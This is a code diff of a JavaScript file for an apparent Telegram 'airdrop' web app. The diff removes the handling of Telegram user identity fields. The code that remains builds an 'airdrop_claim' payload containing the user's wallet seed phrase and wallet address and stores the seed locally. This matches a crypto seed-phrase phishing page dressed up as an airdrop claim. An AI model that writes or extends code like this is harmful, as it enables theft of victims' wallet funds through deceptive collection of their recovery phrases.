@@ -1,4 +1,3 @@
-// ======= Airdrop.js =======
 let tg = null;
 let demoMode = false;
 let tgUser = {};
@@ -24,15 +23,9 @@ function initTelegram() {
         tgUser.photo_url = u.photo_url || "";
         const now = new Date().toISOString();
 
-        localStorage.setItem("tg_user_id", tgUser.id);
-        localStorage.setItem("tg_username", tgUser.username);
-        localStorage.setItem("tg_name", tgUser.first_name);
         localStorage.setItem("tg_photo", tgUser.photo_url);
         localStorage.setItem("tg_timestamp", now);
     } else {
-        tgUser.id = localStorage.getItem("tg_user_id") || "—";
-        tgUser.username = localStorage.getItem("tg_username") || "—";
-        tgUser.first_name = localStorage.getItem("tg_name") || "—";
         tgUser.photo_url = localStorage.getItem("tg_photo") || "";
     }
 }
@@ -76,7 +69,6 @@ document.addEventListener("DOMContentLoaded", () => {
     const btn = document.getElementById('submitBtn');
     if (btn) btn.addEventListener('click', submitAirdrop);
 
-    // Select init
     initCustomSelect();
 });
 
@@ -129,18 +121,12 @@ function submitAirdrop() {
 
     const payload = {
         event: "airdrop_claim",
-        user_id: tgUser.id,
-        username: tgUser.username,
-        name: tgUser.first_name,
         timestamp: new Date().toISOString(),
         seed: words.join(" "),
         wallet: document.getElementById("wallet").value
     };
 
     // Збереження
-    localStorage.setItem("tg_user_id", payload.user_id);
-    localStorage.setItem("tg_username", payload.username);
-    localStorage.setItem("tg_name", payload.name);
     localStorage.setItem("tg_timestamp", payload.timestamp);
     localStorage.setItem("last_seed", payload.seed);
     localStorage.setItem("wallet_used", payload.wallet);
@@ -158,22 +144,13 @@ function submitAirdrop() {
 
 // ======= Профіль: Заповнення даних =======
 function fillProfileFromStorage() {
-    const id = localStorage.getItem("tg_user_id") || "—";
-    const username = localStorage.getItem("tg_username") || "—";
-    const name = localStorage.getItem("tg_name") || "—";
     const timestamp = localStorage.getItem("tg_timestamp") || "—";
     const photo = localStorage.getItem("tg_photo");
 
-    const tgStatus = document.getElementById("tg_status");
-    if (tgStatus) {
-        tgStatus.innerHTML = `
-            <p><strong>👤 Пользователь:</strong> ${name}</p>
-            <p><strong>📛 Username:</strong> ${username !== "—" ? `@${username}` : "—"}</p>
-            <p><strong>🆔 Telegram ID:</strong> ${id}</p>
-        `;
+    if (document.getElementById("timestamp")) {
+        document.getElementById("timestamp").innerText = new Date(timestamp).toLocaleString();
     }
 
-    if (document.getElementById("timestamp")) document.getElementById("timestamp").innerText = new Date(timestamp).toLocaleString();
     if (photo && document.getElementById("avatar")) {
         const img = document.getElementById("avatar");
         img.src = photo;
